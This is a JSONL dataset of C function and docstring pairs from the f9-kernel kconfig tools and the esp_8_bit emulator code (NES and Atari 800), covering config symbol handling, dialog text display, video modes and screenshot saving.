{"docstring": "/*\n * Find the default symbol for a choice.\n * First try the default values for the choice symbol\n * Next locate the first visible choice value\n * Return NULL if none was found\n */\n", "func_signal": "struct symbol *sym_choice_default(struct symbol *sym)", "code": "{\n\tstruct symbol *def_sym;\n\tstruct property *prop;\n\tstruct expr *e;\n\n\t/* any of the defaults visible? */\n\tfor_all_defaults(sym, prop) {\n\t\tprop->visible.tri = expr_calc_value(prop->visible.expr);\n\t\tif (prop->visible.tri == no)\n\t\t\tcontinue;\n\t\tdef_sym = prop_get_symbol(prop);\n\t\tif (def_sym->visible != no)\n\t\t\treturn def_sym;\n\t}\n\n\t/* just get the first visible value */\n\tprop = sym_get_choice_prop(sym);\n\texpr_list_for_each_sym(prop->expr, e, def_sym)\n\t\tif (def_sym->visible != no)\n\t\t\treturn def_sym;\n\n\t/* failed to locate any defaults */\n\treturn NULL;\n}", "path": "f9-kernel/external/kconfig/symbol.c", "commit_date": "2013-08-09 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/*\n * Expand symbol's names embedded in the string given in argument. Symbols'\n * name to be expanded shall be prefixed by a '$'. Unknown symbol expands to\n * the empty string.\n */\n", "func_signal": "const char *sym_expand_string_value(const char *in)", "code": "{\n\tconst char *src;\n\tchar *res;\n\tsize_t reslen;\n\n\treslen = strlen(in) + 1;\n\tres = malloc(reslen);\n\tres[0] = '\\0';\n\n\twhile ((src = strchr(in, '$'))) {\n\t\tchar *p, name[SYMBOL_MAXLENGTH];\n\t\tconst char *symval = \"\";\n\t\tstruct symbol *sym;\n\t\tsize_t newlen;\n\n\t\tstrncat(res, in, src - in);\n\t\tsrc++;\n\n\t\tp = name;\n\t\twhile (isalnum(*src) || *src == '_')\n\t\t\t*p++ = *src++;\n\t\t*p = '\\0';\n\n\t\tsym = sym_find(name);\n\t\tif (sym != NULL) {\n\t\t\tsym_calc_value(sym);\n\t\t\tsymval = sym_get_string_value(sym);\n\t\t}\n\n\t\tnewlen = strlen(res) + strlen(symval) + strlen(src) + 1;\n\t\tif (newlen > reslen) {\n\t\t\treslen = newlen;\n\t\t\tres = realloc(res, reslen);\n\t\t}\n\n\t\tstrcat(res, symval);\n\t\tin = src;\n\t}\n\tstrcat(res, in);\n\n\treturn res;\n}", "path": "f9-kernel/external/kconfig/symbol.c", "commit_date": "2013-08-09 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/* Free storage for growable string */\n", "func_signal": "void str_free(struct gstr *gs)", "code": "{\n\tif (gs->s)\n\t\tfree(gs->s);\n\tgs->s = NULL;\n\tgs->len = 0;\n}", "path": "f9-kernel/external/kconfig/util.c", "commit_date": "2014-02-11 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/* return NULL when dependencies are OK */\n", "func_signal": "static struct symbol *sym_check_sym_deps(struct symbol *sym)", "code": "{\n\tstruct symbol *sym2;\n\tstruct property *prop;\n\tstruct dep_stack stack;\n\n\tdep_stack_insert(&stack, sym);\n\n\tsym2 = sym_check_expr_deps(sym->rev_dep.expr);\n\tif (sym2)\n\t\tgoto out;\n\n\tfor (prop = sym->prop; prop; prop = prop->next) {\n\t\tif (prop->type == P_CHOICE || prop->type == P_SELECT)\n\t\t\tcontinue;\n\t\tstack.prop = prop;\n\t\tsym2 = sym_check_expr_deps(prop->visible.expr);\n\t\tif (sym2)\n\t\t\tbreak;\n\t\tif (prop->type != P_DEFAULT || sym_is_choice(sym))\n\t\t\tcontinue;\n\t\tstack.expr = prop->expr;\n\t\tsym2 = sym_check_expr_deps(prop->expr);\n\t\tif (sym2)\n\t\t\tbreak;\n\t\tstack.expr = NULL;\n\t}\n\nout:\n\tdep_stack_remove();\n\n\treturn sym2;\n}", "path": "f9-kernel/external/kconfig/symbol.c", "commit_date": "2013-08-09 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/* Atomic ops */\n", "func_signal": "void atomic_set(atomic_t *atom, atomic_t newval)", "code": "{\n\t__asm__ __volatile__(\"mov r1, %0\" : : \"r\"(newval));\n\t__asm__ __volatile__(\"atomic_try: ldrex r0, [%0]\\n\"\n\t                     \"strex r0, r1, [%0]\\n\"\n\t                     \"cmp r0, #0\"\n\t                     :\n\t                     : \"r\"(atom));\n\t__asm__ __volatile__(\"bne atomic_try\");\n}", "path": "f9-kernel/platform/bitops.c", "commit_date": "2014-01-29 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/*\n * Print current position\n */\n", "func_signal": "static void print_position(WINDOW * win)", "code": "{\n\tint percent;\n\n\twattrset(win, dlg.position_indicator.atr);\n\twbkgdset(win, dlg.position_indicator.atr & A_COLOR);\n\tpercent = (page - buf) * 100 / strlen(buf);\n\twmove(win, getmaxy(win) - 3, getmaxx(win) - 9);\n\twprintw(win, \"(%3d%%)\", percent);\n}", "path": "f9-kernel/external/kconfig/lxdialog/textbox.c", "commit_date": "2013-08-09 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/* Allocate initial growable string */\n", "func_signal": "struct gstr str_new(void)", "code": "{\n\tstruct gstr gs;\n\tgs.s = malloc(sizeof(char) * 64);\n\tgs.len = 64;\n\tgs.max_width = 0;\n\tstrcpy(gs.s, \"\\0\");\n\treturn gs;\n}", "path": "f9-kernel/external/kconfig/util.c", "commit_date": "2014-02-11 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/*\n * Go back 'n' lines in text. Called by dialog_textbox().\n * 'page' will be updated to point to the desired line in 'buf'.\n */\n", "func_signal": "static void back_lines(int n)", "code": "{\n\tint i;\n\n\tbegin_reached = 0;\n\t/* Go back 'n' lines */\n\tfor (i = 0; i < n; i++) {\n\t\tif (*page == '\\0') {\n\t\t\tif (end_reached) {\n\t\t\t\tend_reached = 0;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\t\tif (page == buf) {\n\t\t\tbegin_reached = 1;\n\t\t\treturn;\n\t\t}\n\t\tpage--;\n\t\tdo {\n\t\t\tif (page == buf) {\n\t\t\t\tbegin_reached = 1;\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tpage--;\n\t\t} while (*page != '\\n');\n\t\tpage++;\n\t}\n}", "path": "f9-kernel/external/kconfig/lxdialog/textbox.c", "commit_date": "2013-08-09 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/* write a dependency file as used by kbuild to track dependencies */\n", "func_signal": "int file_write_dep(const char *name)", "code": "{\n\tchar *str;\n\tchar buf[PATH_MAX+1], buf2[PATH_MAX+1], dir[PATH_MAX+1];\n\tstruct symbol *sym, *env_sym;\n\tstruct expr *e;\n\tstruct file *file;\n\tFILE *out;\n\n\tif (!name)\n\t\tname = \".kconfig.d\";\n\n\tstrcpy(dir, conf_get_configname());\n\tstr = strrchr(dir, '/');\n\tif (str)\n\t\tstr[1] = 0;\n\telse\n\t\tdir[0] = 0;\n\n\tsprintf(buf, \"%s..config.tmp\", dir);\n\tout = fopen(buf, \"w\");\n\tif (!out)\n\t\treturn 1;\n\tfprintf(out, \"deps_config := \\\\\\n\");\n\tfor (file = file_list; file; file = file->next) {\n\t\tif (file->next)\n\t\t\tfprintf(out, \"\\t%s \\\\\\n\", file->name);\n\t\telse\n\t\t\tfprintf(out, \"\\t%s\\n\", file->name);\n\t}\n\tfprintf(out, \"\\n%s: \\\\\\n\"\n\t\t     \"\\t$(deps_config)\\n\\n\", conf_get_autoconfig_name());\n\n\texpr_list_for_each_sym(sym_env_list, e, sym) {\n\t\tstruct property *prop;\n\t\tconst char *value;\n\n\t\tprop = sym_get_env_prop(sym);\n\t\tenv_sym = prop_get_symbol(prop);\n\t\tif (!env_sym)\n\t\t\tcontinue;\n\t\tvalue = getenv(env_sym->name);\n\t\tif (!value)\n\t\t\tvalue = \"\";\n\t\tfprintf(out, \"ifneq \\\"$(%s)\\\" \\\"%s\\\"\\n\", env_sym->name, value);\n\t\tfprintf(out, \"%s: FORCE\\n\", conf_get_autoconfig_name());\n\t\tfprintf(out, \"endif\\n\");\n\t}\n\n\tfprintf(out, \"\\n$(deps_config): ;\\n\");\n\tfclose(out);\n\tsprintf(buf2, \"%s%s\", dir, name);\n\trename(buf, buf2);\n\treturn 0;\n}", "path": "f9-kernel/external/kconfig/util.c", "commit_date": "2014-02-11 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/*\n * Find the default value associated to a symbol.\n * For tristate symbol handle the modules=n case\n * in which case \"m\" becomes \"y\".\n * If the symbol does not have any default then fallback\n * to the fixed default values.\n */\n", "func_signal": "const char *sym_get_string_default(struct symbol *sym)", "code": "{\n\tstruct property *prop;\n\tstruct symbol *ds;\n\tconst char *str;\n\ttristate val;\n\n\tsym_calc_visibility(sym);\n\tsym_calc_value(modules_sym);\n\tval = symbol_no.curr.tri;\n\tstr = symbol_empty.curr.val;\n\n\t/* If symbol has a default value look it up */\n\tprop = sym_get_default_prop(sym);\n\tif (prop != NULL) {\n\t\tswitch (sym->type) {\n\t\tcase S_BOOLEAN:\n\t\tcase S_TRISTATE:\n\t\t\t/* The visibility may limit the value from yes => mod */\n\t\t\tval = EXPR_AND(expr_calc_value(prop->expr), prop->visible.tri);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\t/*\n\t\t\t * The following fails to handle the situation\n\t\t\t * where a default value is further limited by\n\t\t\t * the valid range.\n\t\t\t */\n\t\t\tds = prop_get_symbol(prop);\n\t\t\tif (ds != NULL) {\n\t\t\t\tsym_calc_value(ds);\n\t\t\t\tstr = (const char *)ds->curr.val;\n\t\t\t}\n\t\t}\n\t}\n\n\t/* Handle select statements */\n\tval = EXPR_OR(val, sym->rev_dep.tri);\n\n\t/* transpose mod to yes if modules are not enabled */\n\tif (val == mod)\n\t\tif (!sym_is_choice_value(sym) && modules_sym->curr.tri == no)\n\t\t\tval = yes;\n\n\t/* transpose mod to yes if type is bool */\n\tif (sym->type == S_BOOLEAN && val == mod)\n\t\tval = yes;\n\n\tswitch (sym->type) {\n\tcase S_BOOLEAN:\n\tcase S_TRISTATE:\n\t\tswitch (val) {\n\t\tcase no: return \"n\";\n\t\tcase mod: return \"m\";\n\t\tcase yes: return \"y\";\n\t\t}\n\tcase S_INT:\n\tcase S_HEX:\n\t\treturn str;\n\tcase S_STRING:\n\t\treturn str;\n\tcase S_OTHER:\n\tcase S_UNKNOWN:\n\t\tbreak;\n\t}\n\treturn \"\";\n}", "path": "f9-kernel/external/kconfig/symbol.c", "commit_date": "2013-08-09 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/*\n * Print a new page of text. Called by dialog_textbox().\n */\n", "func_signal": "static void print_page(WINDOW * win, int height, int width)", "code": "{\n\tint i, passed_end = 0;\n\n\tpage_length = 0;\n\tfor (i = 0; i < height; i++) {\n\t\tprint_line(win, i, width);\n\t\tif (!passed_end)\n\t\t\tpage_length++;\n\t\tif (end_reached && !passed_end)\n\t\t\tpassed_end = 1;\n\t}\n\twnoutrefresh(win);\n}", "path": "f9-kernel/external/kconfig/lxdialog/textbox.c", "commit_date": "2013-08-09 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/*\n * Return current line of text. Called by dialog_textbox() and print_line().\n * 'page' should point to start of current line before calling, and will be\n * updated to point to start of next line.\n */\n", "func_signal": "static char *get_line(void)", "code": "{\n\tint i = 0;\n\tstatic char line[MAX_LEN + 1];\n\n\tend_reached = 0;\n\twhile (*page != '\\n') {\n\t\tif (*page == '\\0') {\n\t\t\tif (!end_reached) {\n\t\t\t\tend_reached = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t} else if (i < MAX_LEN)\n\t\t\tline[i++] = *(page++);\n\t\telse {\n\t\t\t/* Truncate lines longer than MAX_LEN characters */\n\t\t\tif (i == MAX_LEN)\n\t\t\t\tline[i++] = '\\0';\n\t\t\tpage++;\n\t\t}\n\t}\n\tif (i <= MAX_LEN)\n\t\tline[i] = '\\0';\n\tif (!end_reached)\n\t\tpage++;\t\t/* move pass '\\n' */\n\n\treturn line;\n}", "path": "f9-kernel/external/kconfig/lxdialog/textbox.c", "commit_date": "2013-08-09 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/*\n * refresh window content\n */\n", "func_signal": "static void refresh_text_box(WINDOW *dialog, WINDOW *box, int boxh, int boxw,\n\t\t\t\t\t\t\t  int cur_y, int cur_x)", "code": "{\n\tprint_page(box, boxh, boxw);\n\tprint_position(dialog);\n\twmove(dialog, cur_y, cur_x);\t/* Restore cursor position */\n\twrefresh(dialog);\n}", "path": "f9-kernel/external/kconfig/lxdialog/textbox.c", "commit_date": "2013-08-09 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/*\n * Display text from a file in a dialog box.\n */\n", "func_signal": "int dialog_textbox(const char *title, const char *tbuf,\n\t\t   int initial_height, int initial_width)", "code": "{\n\tint i, x, y, cur_x, cur_y, key = 0;\n\tint height, width, boxh, boxw;\n\tint passed_end;\n\tWINDOW *dialog, *box;\n\n\tbegin_reached = 1;\n\tend_reached = 0;\n\tpage_length = 0;\n\thscroll = 0;\n\tbuf = tbuf;\n\tpage = buf;\t/* page is pointer to start of page to be displayed */\n\ndo_resize:\n\tgetmaxyx(stdscr, height, width);\n\tif (height < 8 || width < 8)\n\t\treturn -ERRDISPLAYTOOSMALL;\n\tif (initial_height != 0)\n\t\theight = initial_height;\n\telse\n\t\tif (height > 4)\n\t\t\theight -= 4;\n\t\telse\n\t\t\theight = 0;\n\tif (initial_width != 0)\n\t\twidth = initial_width;\n\telse\n\t\tif (width > 5)\n\t\t\twidth -= 5;\n\t\telse\n\t\t\twidth = 0;\n\n\t/* center dialog box on screen */\n\tx = (COLS - width) / 2;\n\ty = (LINES - height) / 2;\n\n\tdraw_shadow(stdscr, y, x, height, width);\n\n\tdialog = newwin(height, width, y, x);\n\tkeypad(dialog, TRUE);\n\n\t/* Create window for box region, used for scrolling text */\n\tboxh = height - 4;\n\tboxw = width - 2;\n\tbox = subwin(dialog, boxh, boxw, y + 1, x + 1);\n\twattrset(box, dlg.dialog.atr);\n\twbkgdset(box, dlg.dialog.atr & A_COLOR);\n\n\tkeypad(box, TRUE);\n\n\t/* register the new window, along with its borders */\n\tdraw_box(dialog, 0, 0, height, width,\n\t\t dlg.dialog.atr, dlg.border.atr);\n\n\twattrset(dialog, dlg.border.atr);\n\tmvwaddch(dialog, height - 3, 0, ACS_LTEE);\n\tfor (i = 0; i < width - 2; i++)\n\t\twaddch(dialog, ACS_HLINE);\n\twattrset(dialog, dlg.dialog.atr);\n\twbkgdset(dialog, dlg.dialog.atr & A_COLOR);\n\twaddch(dialog, ACS_RTEE);\n\n\tprint_title(dialog, title, width);\n\n\tprint_button(dialog, gettext(\" Exit \"), height - 2, width / 2 - 4, TRUE);\n\twnoutrefresh(dialog);\n\tgetyx(dialog, cur_y, cur_x);\t/* Save cursor position */\n\n\t/* Print first page of text */\n\tattr_clear(box, boxh, boxw, dlg.dialog.atr);\n\trefresh_text_box(dialog, box, boxh, boxw, cur_y, cur_x);\n\n\twhile ((key != KEY_ESC) && (key != '\\n')) {\n\t\tkey = wgetch(dialog);\n\t\tswitch (key) {\n\t\tcase 'E':\t/* Exit */\n\t\tcase 'e':\n\t\tcase 'X':\n\t\tcase 'x':\n\t\t\tdelwin(box);\n\t\t\tdelwin(dialog);\n\t\t\treturn 0;\n\t\tcase 'g':\t/* First page */\n\t\tcase KEY_HOME:\n\t\t\tif (!begin_reached) {\n\t\t\t\tbegin_reached = 1;\n\t\t\t\tpage = buf;\n\t\t\t\trefresh_text_box(dialog, box, boxh, boxw,\n\t\t\t\t\t\t cur_y, cur_x);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'G':\t/* Last page */\n\t\tcase KEY_END:\n\n\t\t\tend_reached = 1;\n\t\t\t/* point to last char in buf */\n\t\t\tpage = buf + strlen(buf);\n\t\t\tback_lines(boxh);\n\t\t\trefresh_text_box(dialog, box, boxh, boxw,\n\t\t\t\t\t cur_y, cur_x);\n\t\t\tbreak;\n\t\tcase 'K':\t/* Previous line */\n\t\tcase 'k':\n\t\tcase KEY_UP:\n\t\t\tif (!begin_reached) {\n\t\t\t\tback_lines(page_length + 1);\n\n\t\t\t\t/* We don't call print_page() here but use\n\t\t\t\t * scrolling to ensure faster screen update.\n\t\t\t\t * However, 'end_reached' and 'page_length'\n\t\t\t\t * should still be updated, and 'page' should\n\t\t\t\t * point to start of next page. This is done\n\t\t\t\t * by calling get_line() in the following\n\t\t\t\t * 'for' loop. */\n\t\t\t\tscrollok(box, TRUE);\n\t\t\t\twscrl(box, -1);\t/* Scroll box region down one line */\n\t\t\t\tscrollok(box, FALSE);\n\t\t\t\tpage_length = 0;\n\t\t\t\tpassed_end = 0;\n\t\t\t\tfor (i = 0; i < boxh; i++) {\n\t\t\t\t\tif (!i) {\n\t\t\t\t\t\t/* print first line of page */\n\t\t\t\t\t\tprint_line(box, 0, boxw);\n\t\t\t\t\t\twnoutrefresh(box);\n\t\t\t\t\t} else\n\t\t\t\t\t\t/* Called to update 'end_reached' and 'page' */\n\t\t\t\t\t\tget_line();\n\t\t\t\t\tif (!passed_end)\n\t\t\t\t\t\tpage_length++;\n\t\t\t\t\tif (end_reached && !passed_end)\n\t\t\t\t\t\tpassed_end = 1;\n\t\t\t\t}\n\n\t\t\t\tprint_position(dialog);\n\t\t\t\twmove(dialog, cur_y, cur_x);\t/* Restore cursor position */\n\t\t\t\twrefresh(dialog);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 'B':\t/* Previous page */\n\t\tcase 'b':\n\t\tcase KEY_PPAGE:\n\t\t\tif (begin_reached)\n\t\t\t\tbreak;\n\t\t\tback_lines(page_length + boxh);\n\t\t\trefresh_text_box(dialog, box, boxh, boxw,\n\t\t\t\t\t cur_y, cur_x);\n\t\t\tbreak;\n\t\tcase 'J':\t/* Next line */\n\t\tcase 'j':\n\t\tcase KEY_DOWN:\n\t\t\tif (!end_reached) {\n\t\t\t\tbegin_reached = 0;\n\t\t\t\tscrollok(box, TRUE);\n\t\t\t\tscroll(box);\t/* Scroll box region up one line */\n\t\t\t\tscrollok(box, FALSE);\n\t\t\t\tprint_line(box, boxh - 1, boxw);\n\t\t\t\twnoutrefresh(box);\n\t\t\t\tprint_position(dialog);\n\t\t\t\twmove(dialog, cur_y, cur_x);\t/* Restore cursor position */\n\t\t\t\twrefresh(dialog);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase KEY_NPAGE:\t/* Next page */\n\t\tcase ' ':\n\t\t\tif (end_reached)\n\t\t\t\tbreak;\n\n\t\t\tbegin_reached = 0;\n\t\t\trefresh_text_box(dialog, box, boxh, boxw,\n\t\t\t\t\t cur_y, cur_x);\n\t\t\tbreak;\n\t\tcase '0':\t/* Beginning of line */\n\t\tcase 'H':\t/* Scroll left */\n\t\tcase 'h':\n\t\tcase KEY_LEFT:\n\t\t\tif (hscroll <= 0)\n\t\t\t\tbreak;\n\n\t\t\tif (key == '0')\n\t\t\t\thscroll = 0;\n\t\t\telse\n\t\t\t\thscroll--;\n\t\t\t/* Reprint current page to scroll horizontally */\n\t\t\tback_lines(page_length);\n\t\t\trefresh_text_box(dialog, box, boxh, boxw,\n\t\t\t\t\t cur_y, cur_x);\n\t\t\tbreak;\n\t\tcase 'L':\t/* Scroll right */\n\t\tcase 'l':\n\t\tcase KEY_RIGHT:\n\t\t\tif (hscroll >= MAX_LEN)\n\t\t\t\tbreak;\n\t\t\thscroll++;\n\t\t\t/* Reprint current page to scroll horizontally */\n\t\t\tback_lines(page_length);\n\t\t\trefresh_text_box(dialog, box, boxh, boxw,\n\t\t\t\t\t cur_y, cur_x);\n\t\t\tbreak;\n\t\tcase KEY_ESC:\n\t\t\tkey = on_key_esc(dialog);\n\t\t\tbreak;\n\t\tcase KEY_RESIZE:\n\t\t\tback_lines(height);\n\t\t\tdelwin(box);\n\t\t\tdelwin(dialog);\n\t\t\ton_key_resize();\n\t\t\tgoto do_resize;\n\t\t}\n\t}\n\tdelwin(box);\n\tdelwin(dialog);\n\treturn key;\t\t/* ESC pressed */\n}", "path": "f9-kernel/external/kconfig/lxdialog/textbox.c", "commit_date": "2013-08-09 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/* file already present in list? If not add it */\n", "func_signal": "struct file *file_lookup(const char *name)", "code": "{\n\tstruct file *file;\n\tconst char *file_name = sym_expand_string_value(name);\n\n\tfor (file = file_list; file; file = file->next) {\n\t\tif (!strcmp(name, file->name)) {\n\t\t\tfree((void *)file_name);\n\t\t\treturn file;\n\t\t}\n\t}\n\n\tfile = malloc(sizeof(*file));\n\tmemset(file, 0, sizeof(*file));\n\tfile->name = file_name;\n\tfile->next = file_list;\n\tfile_list = file;\n\treturn file;\n}", "path": "f9-kernel/external/kconfig/util.c", "commit_date": "2014-02-11 00:00:00", "repo_name": "f9micro/f9-kernel", "stars": 673, "license": "other", "language": "c", "size": 1205}
{"docstring": "/* emulated machine tells us which resolution it wants */\n", "func_signal": "int vid_setmode(int width, int height)", "code": "{\n   if (NULL != primary_buffer)\n      bmp_destroy(&primary_buffer);\n//   if (NULL != back_buffer)\n//      bmp_destroy(&back_buffer);\n\n   primary_buffer = bmp_create(width, height, 8); /* no overdraw */\n   if (NULL == primary_buffer)\n      return -1;\n\n   /* Create our backbuffer */\n#if 0\n   back_buffer = bmp_create(width, height, 0); /* no overdraw */\n   if (NULL == back_buffer)\n   {\n      bmp_destroy(&primary_buffer);\n      return -1;\n   }\n   bmp_clear(back_buffer, GUI_BLACK);\n#endif\n   bmp_clear(primary_buffer, GUI_BLACK);\n\n   return 0;\n}", "path": "esp_8_bit/src/nofrendo/vid_drv.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/* Returns screen address for placing the next character on the left of the\n   drawn number. */\n", "func_signal": "static UBYTE *SmallFont_DrawInt(UBYTE *screen, int n, UBYTE color1, UBYTE color2)", "code": "{\n\tdo {\n\t\tSmallFont_DrawChar(screen, n % 10, color1, color2);\n\t\tscreen -= SMALLFONT_WIDTH;\n\t\tn /= 10;\n\t} while (n > 0);\n\treturn screen;\n}", "path": "esp_8_bit/src/atari800/screen.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/* HAVE_LIBPNG */\n", "func_signal": "int Screen_SaveScreenshot(const char *filename, int interlaced)", "code": "{\n\tint is_png;\n\tFILE *fp;\n\tULONG *main_screen_atari;\n\tUBYTE *ptr1;\n\tUBYTE *ptr2;\n\tif (striendswith(filename, \".pcx\"))\n\t\tis_png = 0;\n#ifdef HAVE_LIBPNG\n\telse if (striendswith(filename, \".png\"))\n\t\tis_png = 1;\n#endif\n\telse\n\t\treturn FALSE;\n\tfp = fopen(filename, \"wb\");\n\tif (fp == NULL)\n\t\treturn FALSE;\n\tmain_screen_atari = Screen_atari;\n\tptr1 = (UBYTE *) Screen_atari + ATARI_LEFT_MARGIN;\n\tif (interlaced) {\n\t\tScreen_atari = (ULONG *) Util_malloc(Screen_WIDTH * Screen_HEIGHT);\n\t\tptr2 = (UBYTE *) Screen_atari + ATARI_LEFT_MARGIN;\n\t\tANTIC_Frame(TRUE); /* draw on Screen_atari */\n\t}\n\telse {\n\t\tptr2 = NULL;\n\t}\n\tif (is_png) {\n#ifdef HAVE_LIBPNG\n\t\tScreen_SavePNG(fp, ptr1, ptr2);\n#endif\n\t}\n\telse\n\t\tScreen_SavePCX(fp, ptr1, ptr2);\n\tfclose(fp);\n\tif (interlaced) {\n\t\tfree(Screen_atari);\n\t\tScreen_atari = main_screen_atari;\n\t}\n\treturn TRUE;\n}", "path": "esp_8_bit/src/atari800/screen.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/* some system dependent replacement routines (for speed) */\n", "func_signal": "INLINE int vid_memcmp(const void *p1, const void *p2, int len)", "code": "{\n   /* check for 32-bit aligned data */\n   if (0 == (((uint32) p1 & 3) | ((uint32) p2 & 3)))\n   {\n      uint32 *dw1 = (uint32 *) p1;\n      uint32 *dw2 = (uint32 *) p2;\n\n      len >>= 2;\n\n      DUFFS_DEVICE(if (*dw1++ != *dw2++) return -1, len);\n   }\n   else\n   /* fall back to 8-bit compares */\n   {\n      uint8 *b1 = (uint8 *) p1;\n      uint8 *b2 = (uint8 *) p2;\n      \n      DUFFS_DEVICE(if (*b1++ != *b2++) return -1, len);\n   }\n   \n   return 0;\n}", "path": "esp_8_bit/src/nofrendo/vid_drv.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/* VRCVI sawtooth wave generation */\n", "func_signal": "static int32 vrcvi_sawtooth(vrcvisawtooth_t *chan)", "code": "{\n   /* reg0: 0-5=phase accumulator bits\n   ** reg1: 8 bits of freq\n   ** reg2: 0-3=high freq, 7=enable\n   */\n\n   chan->accum -= vrcvi.incsize; /* # of clocks per wav cycle */\n   while (chan->accum < 0)\n   {\n      chan->accum += chan->freq;\n      chan->output_acc += chan->volume;\n      \n      chan->adder++;\n      if (7 == chan->adder)\n      {\n         chan->adder = 0;\n         chan->output_acc = 0;\n      }\n   }\n\n   /* return if not enabled */\n   if (false == chan->enabled)\n      return 0;\n\n   return (chan->output_acc >> 3) << 9;\n}", "path": "esp_8_bit/src/nofrendo/vrcvisnd.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/*************************************************/\n/* Set banks from the combined register values   */\n/*************************************************/\n", "func_signal": "static void map46_set_banks (void)", "code": "{\n  /* Set the PRG and CHR pages */\n  mmc_bankrom (32, 0x8000, (prg_high_bank << 1) | (prg_low_bank));\n  mmc_bankvrom (8, 0x0000, (chr_high_bank << 3) | (chr_low_bank));\n\n  /* Done */\n  return;\n}", "path": "esp_8_bit/src/nofrendo/map046.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/* Opens a GZIP compressed file and decompresses its contents to outfp.\n   Returns TRUE on success. */\n", "func_signal": "int CompFile_ExtractGZ(const char *infilename, FILE *outfp)", "code": "{\n#ifndef HAVE_LIBZ\n\tLog_print(\"This executable cannot decompress ZLIB files\");\n\treturn FALSE;\n#else\n\t/* TODO: replace gz* with low-level light-weight ZLIB functions. */\n\tgzFile gzf = gzopen(infilename, \"rb\");\n\tvoid *buf;\n\tint result;\n\tif (gzf == NULL) {\n\t\tLog_print(\"ZLIB could not open file %s\", infilename);\n\t\treturn FALSE;\n\t}\n#define UNCOMPRESS_BUFFER_SIZE 32768\n\tbuf = Util_malloc(UNCOMPRESS_BUFFER_SIZE);\n\tdo {\n\t\tresult = gzread(gzf, buf, UNCOMPRESS_BUFFER_SIZE);\n\t\tif (result > 0) {\n\t\t\tif ((int) fwrite(buf, 1, result, outfp) != result)\n\t\t\t\tresult = -1;\n\t\t}\n\t} while (result == UNCOMPRESS_BUFFER_SIZE);\n\tfree(buf);\n\tgzclose(gzf);\n\treturn result >= 0;\n#endif\t/* HAVE_LIBZ */\n}", "path": "esp_8_bit/src/atari800/compfile.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/* set up the event system for a certain console/system type */\n", "func_signal": "void event_set_system(system_t type)", "code": "{\n   ASSERT(type < NUM_SUPPORTED_SYSTEMS);\n\n   system_events = event_system_table[type];\n}", "path": "esp_8_bit/src/nofrendo/event.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/* converts \"foo%bar##.pcx\" to \"foo%%bar%02d.pcx\" */\n", "func_signal": "static void Screen_SetScreenshotFilenamePattern(const char *p)", "code": "{\n\tchar *f = screenshot_filename_format;\n\tchar no_width = '0';\n\tscreenshot_no_max = 1;\n\t/* 9 because sprintf'ed \"no\" can be 9 digits */\n\twhile (f < screenshot_filename_format + FILENAME_MAX - 9) {\n\t\t/* replace a sequence of hashes with e.g. \"%05d\" */\n\t\tif (*p == '#') {\n\t\t\tif (no_width > '0') /* already seen a sequence of hashes */\n\t\t\t\tbreak;          /* invalid */\n\t\t\t/* count hashes */\n\t\t\tdo {\n\t\t\t\tscreenshot_no_max *= 10;\n\t\t\t\tp++;\n\t\t\t\tno_width++;\n\t\t\t\t/* now no_width is the number of hashes seen so far\n\t\t\t\t   and p points after the counted hashes */\n\t\t\t} while (no_width < '9' && *p == '#'); /* no more than 9 hashes */\n\t\t\t*f++ = '%';\n\t\t\t*f++ = '0';\n\t\t\t*f++ = no_width;\n\t\t\t*f++ = 